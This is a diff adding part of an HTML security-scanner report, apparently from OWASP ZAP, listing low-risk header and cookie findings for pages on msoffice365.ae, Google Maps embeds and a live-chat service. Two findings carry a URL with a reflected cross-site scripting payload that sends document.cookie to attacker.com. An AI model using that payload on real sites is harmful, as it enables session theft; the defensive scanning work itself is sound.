+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Incomplete or No Cache-control and Pragma HTTP Header Set</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>The cache-control and pragma HTTP header have not been set properly or are missing allowing the browser and proxies to cache content.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2842.5003378599404!2d55.38358165988975!3d25.11177058898032!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3e5f644400000001%3A0x60a9746d88e1664d!2sBuzinessware-+Middle+East+Hosting+Specialists!5e0!3m2!1sen!2sae!4v1490248776596</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">no-cache, must-revalidate</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://www.google.com/maps/vt?pb=!1m4!1m3!1i16!2i42849!3i28042!1m4!1m3!1i16!2i42849!3i28043!1m4!1m3!1i16!2i42850!3i28042!1m4!1m3!1i16!2i42850!3i28043!1m4!1m3!1i16!2i42851!3i28042!1m4!1m3!1i16!2i42851!3i28043!2m3!1e0!2sm!3i405103058!2m36!1e2!2sspotlight!5i1!8m32!1m8!12m7!10b0!12splaceholder!19m3!1b0!2zNSw2LDI0LDQ1LDc1LDkz!3s0x0%3A0x60a9746d88e1664d!20e1!2m6!1s0x3e5f644400000001%3A0x60a9746d88e1664d!2sBuzinessware-+Middle+East+Hosting+Specialists!4m2!3d25.112001!4d55.384344!5e0!11e11!13m11!2sa!14b1!18m4!5b0!6b0!8b0!9b0!22m3!6e2!7e3!8e2!19u14!19u20!19u29!3m14!2sen-US!3sAE!5e289!12m4!1e52!2m2!1sentity_class!2s0!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!4e3!12m1!5b1&amp;token=67952</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">public, max-age=300</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">2</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Whenever possible ensure the cache-control HTTP header is set with no-cache, no-store, must-revalidate; and that the pragma HTTP header is set with no-cache.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Web_Content_Caching</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">525</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">13</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">X-Content-Type-Options Header Missing</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2842.5003378599404!2d55.38358165988975!3d25.11177058898032!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3e5f644400000001%3A0x60a9746d88e1664d!2sBuzinessware-+Middle+East+Hosting+Specialists!5e0!3m2!1sen!2sae!4v1490248776596</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">1</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Other information</td><td width="80%"><p>This issue still applies to error type pages (401, 403, 500, etc) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</p><p>At "High" threshold this scanner will not alert on client or server error responses.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx</p><p>https://www.owasp.org/index.php/List_of_useful_HTTP_headers</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">16</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Cross-Domain JavaScript Source File Inclusion</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>The page includes one or more script files from a third-party domain.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2842.5003378599404!2d55.38358165988975!3d25.11177058898032!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3e5f644400000001%3A0x60a9746d88e1664d!2sBuzinessware-+Middle+East+Hosting+Specialists!5e0!3m2!1sen!2sae!4v1490248776596</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">https://maps.googleapis.com/maps/api/js?client=google-maps-embed&amp;paint_origin=&amp;libraries=geometry,search&amp;v=3.exp&amp;language=en_US&amp;region=ae</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">&lt;script src="https://maps.googleapis.com/maps/api/js?client=google-maps-embed&amp;amp;paint_origin=&amp;amp;libraries=geometry,search&amp;amp;v=3.exp&amp;amp;language=en_US&amp;amp;region=ae"&gt;&lt;/script&gt;</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2842.5003378599404!2d55.38358165988975!3d25.11177058898032!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3e5f644400000001%3A0x60a9746d88e1664d!2sBuzinessware-+Middle+East+Hosting+Specialists!5e0!3m2!1sen!2sae!4v1490248776596</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">https://maps.gstatic.com/maps-api-v3/embed/js/31/3/init_embed.js</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">&lt;script src="https://maps.gstatic.com/maps-api-v3/embed/js/31/3/init_embed.js"&gt;&lt;/script&gt;</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">2</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Ensure JavaScript source files are loaded from only trusted sources, and the sources can't be controlled by end users of the application.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p></p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">829</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">X-Content-Type-Options Header Missing</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://msoffice365.ae/contact-sales.html?reason=%3Cscript%3Edocument.location=%27https://attacker.com/log.php?c=%27%20+%20encodeURIComponent(document.cookie)%3C/script%3E</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">1</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Other information</td><td width="80%"><p>This issue still applies to error type pages (401, 403, 500, etc) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</p><p>At "High" threshold this scanner will not alert on client or server error responses.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx</p><p>https://www.owasp.org/index.php/List_of_useful_HTTP_headers</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">16</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Web Browser XSS Protection Not Enabled</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>Web Browser XSS Protection is not enabled, or is disabled by the configuration of the 'X-XSS-Protection' HTTP response header on the web server</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://msoffice365.ae/contact-sales.html?reason=%3Cscript%3Edocument.location=%27https://attacker.com/log.php?c=%27%20+%20encodeURIComponent(document.cookie)%3C/script%3E</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-XSS-Protection</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">1</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Ensure that the web browser's XSS filter is enabled, by setting the X-XSS-Protection HTTP response header to '1'.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Other information</td><td width="80%"><p>The X-XSS-Protection HTTP response header allows the web server to enable or disable the web browser's XSS protection mechanism. The following values would attempt to enable it: </p><p>X-XSS-Protection: 1; mode=block</p><p>X-XSS-Protection: 1; report=http://www.example.com/xss</p><p>The following values would disable it:</p><p>X-XSS-Protection: 0</p><p>The X-XSS-Protection HTTP response header is currently supported on Internet Explorer, Chrome and Safari (WebKit).</p><p>Note that this alert is only raised if the response body could potentially contain an XSS payload (with a text-based content type, with a non-zero length).</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</p><p>https://blog.veracode.com/2014/03/guidelines-for-setting-security-headers/</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">933</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">14</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Cookie Without Secure Flag</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>A cookie has been set without the secure flag, which means that the cookie can be accessed via unencrypted connections.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645827116&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_12426</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514646044553&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_43066</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645995543&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_788239</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645827116&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_12426</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514646044553&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_43066</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645995543&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_788239</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514646019555&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_532886</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514646019555&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_532886</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645874024&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_607981</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645874024&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_607981</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645881008&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_962897</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645881008&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_962897</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645813675&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_470283</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645905568&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_266776</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645842099&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_820543</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645984542&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_559814</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645860057&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_503013</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645897567&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_181946</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat_lastvisit</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat_lastvisit</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645867041&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_793533</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
